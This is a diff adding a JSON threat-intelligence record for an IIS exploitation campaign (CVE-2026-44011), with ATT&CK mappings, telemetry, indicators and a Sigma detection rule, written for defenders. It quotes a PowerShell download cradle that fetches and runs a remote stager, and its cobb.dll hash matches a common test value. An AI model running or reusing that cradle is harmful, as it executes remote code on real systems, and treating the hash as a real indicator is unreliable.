@@ -1,0 +1,180 @@
+{
+  "summary": "Nimbus Range (UNC-THREAD) is exploiting CVE-2026-44011, a pre-auth deserialization bug in an IIS native WAF module. Code execution lands in w3wp.exe, which then spawns cmd.exe and encoded PowerShell, drops cobb.dll under the IIS temporary compressed files directory, and persists via a Run key.",
+  "cve": "CVE-2026-44011",
+  "cvss": "9.8",
+  "vulnerability_type": "RCE",
+  "threat_actor": "Nimbus Range (UNC-THREAD)",
+  "campaign": "Project Cobalt Thread",
+  "affected": [
+    {
+      "vendor": "Microsoft",
+      "product": "Internet Information Services (IIS) 10",
+      "versions": "Windows Server 2019 and 2022"
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1190",
+      "name": "Exploit Public-Facing Application",
+      "tactic": "Initial Access"
+    },
+    {
+      "id": "T1059.001",
+      "name": "PowerShell",
+      "tactic": "Execution"
+    },
+    {
+      "id": "T1059.003",
+      "name": "Windows Command Shell",
+      "tactic": "Execution"
+    },
+    {
+      "id": "T1547.001",
+      "name": "Registry Run Keys / Startup Folder",
+      "tactic": "Persistence"
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control"
+    }
+  ],
+  "telemetry": [
+    {
+      "os": "windows",
+      "source": "sysmon",
+      "event_id": "1",
+      "name": "Process Creation",
+      "description": "w3wp.exe spawning cmd.exe or powershell.exe with encoded or download-cradle command lines"
+    },
+    {
+      "os": "windows",
+      "source": "windows_security",
+      "event_id": "4688",
+      "name": "A new process has been created",
+      "description": "Same process-creation chain visible in Windows Security auditing"
+    },
+    {
+      "os": "windows",
+      "source": "sysmon",
+      "event_id": "11",
+      "name": "File Create",
+      "description": "Payload cobb.dll written under IIS Temporary Compressed Files"
+    },
+    {
+      "os": "windows",
+      "source": "sysmon",
+      "event_id": "13",
+      "name": "Registry Value Set",
+      "description": "Run key IISHealthCheck set to rundll32 hosting cobb.dll"
+    },
+    {
+      "os": "windows",
+      "source": "sysmon",
+      "event_id": "3",
+      "name": "Network Connection",
+      "description": "powershell.exe connecting to 185.244.214.77:80 for the stager"
+    }
+  ],
+  "process_anomalies": [
+    {
+      "parent_image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+      "child_image": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc",
+      "notes": "IIS worker should not spawn a command shell"
+    },
+    {
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "child_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc",
+      "notes": "Encoded PowerShell download cradle"
+    }
+  ],
+  "command_lines": [
+    "cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc",
+    "powershell.exe -NoP -NonI -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://185.244.214.77/stager.ps1')"
+  ],
+  "paths": [
+    "C:\\Windows\\Temp\\IIS Temporary Compressed Files\\cobb.dll",
+    "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IISHealthCheck"
+  ],
+  "indicators": [
+    {
+      "type": "ip",
+      "value": "185.244.214.77",
+      "context": "Stager host"
+    },
+    {
+      "type": "url",
+      "value": "http://185.244.214.77/stager.ps1",
+      "context": "PowerShell download cradle"
+    },
+    {
+      "type": "hash",
+      "value": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "context": "SHA256 of cobb.dll as published in the advisory"
+    },
+    {
+      "type": "path",
+      "value": "C:\\Windows\\Temp\\IIS Temporary Compressed Files\\cobb.dll",
+      "context": "Dropped payload"
+    },
+    {
+      "type": "registry",
+      "value": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IISHealthCheck",
+      "context": "Persistence Run key"
+    }
+  ],
+  "sigma": {
+    "title": "IIS Worker Spawning Encoded PowerShell",
+    "status": "experimental",
+    "description": "Detects IIS worker process w3wp.exe spawning cmd.exe or powershell.exe, a behavior observed during exploitation of CVE-2026-44011 (Project Cobalt Thread) where a native module runs shellcode in the worker and launches an encoded PowerShell download cradle.",
+    "logsource_category": "process_creation",
+    "logsource_product": "windows",
+    "logsource_service": "",
+    "selections": [
+      {
+        "name": "selection_parent",
+        "is_filter": false,
+        "fields": [
+          {
+            "field": "ParentImage",
+            "modifier": "endswith",
+            "values": ["\\w3wp.exe"]
+          }
+        ]
+      },
+      {
+        "name": "selection_child",
+        "is_filter": false,
+        "fields": [
+          {
+            "field": "Image",
+            "modifier": "endswith",
+            "values": ["\\cmd.exe", "\\powershell.exe", "\\pwsh.exe"]
+          }
+        ]
+      },
+      {
+        "name": "selection_cli",
+        "is_filter": false,
+        "fields": [
+          {
+            "field": "CommandLine",
+            "modifier": "contains",
+            "values": ["-Enc", "-EncodedCommand", "DownloadString", "IIS Temporary Compressed Files"]
+          }
+        ]
+      }
+    ],
+    "condition": "selection_parent and selection_child and selection_cli",
+    "falsepositives": [
+      "Administrator-launched IIS troubleshooting from an interactive session (not from w3wp.exe)",
+      "Custom IIS modules that legitimately shell out — validate against the application inventory"
+    ],
+    "level": "high"
+  },
+  "confidence": "high",
+  "is_actionable": true,
+  "caveats": "Primary detection is the w3wp.exe process tree. Hash 9f86d081... is taken from the advisory and should not be the sole detector. Linux nginx path is explicitly out of scope."
+}
